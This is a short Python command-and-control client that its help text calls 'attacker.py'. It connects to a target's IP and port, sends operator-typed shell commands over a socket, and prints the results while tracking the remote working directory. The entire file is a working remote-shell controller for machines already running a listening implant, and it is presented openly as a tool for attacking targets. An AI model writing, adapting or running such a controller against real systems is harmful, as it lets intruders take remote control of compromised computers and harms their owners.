import sys
import os
import socket
from threading import Thread
import subprocess
import time
import getopt

location = ''

def send_command(connection):
    global location
    while True:
        time.sleep(0.5)
        # print('asd')
        msg = input(location)
        if msg == 'exit':
            break
        connection.send(msg.encode())
        time.sleep(0.5)
        try:
            if msg.index("cd") >= 0:
                connection.send("pwd".encode())
                # location = connection.recv(2048).decode()
                # location = location.strip()
                # location += " > "
                # print(location)
        except:
            continue

    connection.close()

def receive_result(connection):
    global location
    try:
        while True:
            # print('sda')
            result = connection.recv(2048).decode()
            if "pwd:" in result:
                location = result[4:]
                location = location.strip()
                location += " > "
                print(location)
                continue
            print(result)
    except ConnectionAbortedError:
        print("You closed the connection :>")

def reverse(connection):
    r1 = Thread(target=send_command,args=(connection,))
    r2 = Thread(target=receive_result,args=(connection,))
    r1.start()
    r2.start()

def main():
    global location

    ip = ''
    port = 0

    try:
        opts, args = getopt.getopt(sys.argv[1:],"t:p:h",["target=","port=","help"])
    except:
        print("Invalid option")
        exit(0)

    for o,a in opts:
        if o in ("-t","--target"):
            ip = a
        elif o in("-p","--port"):
            try:
                port = int(a)
                # print(port)
                if port < 1 or port > 65535:
                    print("Invalid port number")
                    exit()
            except:
                print("Invalid port")
                exit()
        elif o in ("-h","--help"):
            print("Usage:")
            print("python attacker.py -t targetip -p portnumber")
            print("-t or --target : The ip of the target that you want to attack")
            print("-p or --port : The port number of the target that you want to attack")
            print("\npython attacker.py -h")
            print("-h or --help : print this menu")
            exit()
        
    if port == 0 and ip == '':
        print("You must specify ip address and port number")
        exit()

    # print(ip,port)

    connection = socket.socket()
    connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    connection.connect((ip,port))

    location = connection.recv(2048).decode()
    location = location.rstrip() + " > "
    
    reverse(connection)

main()